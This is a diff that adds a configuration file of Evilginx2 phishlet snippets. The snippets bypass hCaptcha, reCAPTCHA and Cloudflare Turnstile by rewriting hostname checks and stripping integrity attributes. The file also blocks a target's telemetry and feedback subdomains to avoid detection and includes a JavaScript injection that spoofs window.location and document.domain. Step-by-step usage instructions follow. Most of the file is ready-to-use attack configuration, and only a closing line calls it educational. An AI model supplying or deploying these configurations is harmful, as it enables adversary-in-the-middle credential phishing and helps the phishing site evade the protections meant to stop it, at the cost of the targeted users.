@@ -1,0 +1,124 @@
+# =============================================================================
+# CAPTCHA BYPASS CONFIGURATIONS FOR EVILGINX2
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# hCAPTCHA BYPASS CONFIGURATION
+# -----------------------------------------------------------------------------
+# Add these configurations to your phishlet file for hCaptcha bypass
+# This tricks hCaptcha into believing it was loaded on the original hostname
+
+proxy_hosts:
+  - {phish_sub: 'hcaptcha', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'hcaptcha.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
+
+# -----------------------------------------------------------------------------
+# GOOGLE reCAPTCHA BYPASS (Method 2) - JavaScript Modification
+# -----------------------------------------------------------------------------
+# Add these configurations to your phishlet file for Google reCAPTCHA bypass
+# This modifies the JavaScript code responsible for generating the base64 string
+
+proxy_hosts:
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'yourtargetdomain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+
+# -----------------------------------------------------------------------------
+# CLOUDFLARE TURNSTILE BYPASS
+# -----------------------------------------------------------------------------
+# Similar to hCaptcha, replace the hostname in Turnstile challenges
+
+proxy_hosts:
+  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'challenges.cloudflare.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
+
+# -----------------------------------------------------------------------------
+# GENERIC CAPTCHA BYPASS PATTERNS
+# -----------------------------------------------------------------------------
+# These patterns can be applied to various captcha services
+
+# For services that check document.domain
+sub_filters:
+  - {triggers_on: 'captcha-service.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'document.domain', replace: 'document.domain.replace("{hostname}", "{orig_hostname}")', mimes: ['text/javascript']}
+
+# For services that check location.host
+sub_filters:
+  - {triggers_on: 'captcha-service.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'location.host', replace: 'location.host.replace("{hostname}", "{orig_hostname}")', mimes: ['text/javascript']}
+
+# For services that check window.location.origin
+sub_filters:
+  - {triggers_on: 'captcha-service.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'window.location.origin', replace: 'window.location.origin.replace("{hostname}", "{orig_hostname}")', mimes: ['text/javascript']}
+
+# -----------------------------------------------------------------------------
+# ADDITIONAL SECURITY ENHANCEMENTS
+# -----------------------------------------------------------------------------
+
+# Block telemetry/analytics subdomains to prevent detection
+sub_filters:
+  - {triggers_on: 'yourtargetdomain.com', orig_sub: 'analytics', domain: 'yourtargetdomain.com', search: 'analytics\.yourtargetdomain\.com', replace: 'blocked.localhost', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'yourtargetdomain.com', orig_sub: 'telemetry', domain: 'yourtargetdomain.com', search: 'telemetry\.yourtargetdomain\.com', replace: 'blocked.localhost', mimes: ['text/html', 'text/javascript']}
+
+# Modify favicon to avoid content-based detection
+sub_filters:
+  - {triggers_on: 'yourtargetdomain.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'favicon\.ico', replace: 'custom_favicon.ico', mimes: ['text/html']}
+
+# Remove integrity checks that might break with modifications
+sub_filters:
+  - {triggers_on: 'yourtargetdomain.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html']}
+
+# Block feedback/reporting mechanisms
+sub_filters:
+  - {triggers_on: 'yourtargetdomain.com', orig_sub: 'feedback', domain: 'yourtargetdomain.com', search: 'feedback\.yourtargetdomain\.com', replace: 'blocked.localhost', mimes: ['text/html', 'text/javascript']}
+
+# -----------------------------------------------------------------------------
+# JAVASCRIPT INJECTION EXAMPLES
+# -----------------------------------------------------------------------------
+# Use these in your phishlet's js_inject section for dynamic bypasses
+
+js_inject:
+  - {trigger_domains: ["yourtargetdomain.com"], trigger_paths: ["*"], trigger_params: ["*"], code: "
+    // Dynamic captcha bypass
+    (function() {
+      var originalHostname = window.location.hostname;
+      var realHostname = originalHostname.replace('phishing-domain.com', 'yourtargetdomain.com');
+      
+      // Override hostname-related properties
+      Object.defineProperty(window.location, 'hostname', {
+        value: realHostname,
+        writable: false
+      });
+      
+      Object.defineProperty(document, 'domain', {
+        value: realHostname,
+        writable: false
+      });
+      
+      // Intercept and modify captcha-related requests
+      var originalFetch = window.fetch;
+      window.fetch = function(url, options) {
+        if (typeof url === 'string' && url.includes('captcha')) {
+          url = url.replace(originalHostname, realHostname);
+        }
+        return originalFetch.call(this, url, options);
+      };
+    })();
+  "}
+
+# -----------------------------------------------------------------------------
+# USAGE INSTRUCTIONS
+# -----------------------------------------------------------------------------
+# 1. Copy the relevant sections to your phishlet file
+# 2. Replace 'yourtargetdomain.com' with your actual target domain
+# 3. Replace 'phishing-domain.com' with your phishing domain
+# 4. Test thoroughly in a controlled environment
+# 5. Monitor for any breaking changes in captcha services
+
+# NOTE: Always test these configurations in a legal and ethical manner
+# These examples are for educational and authorized security testing only 
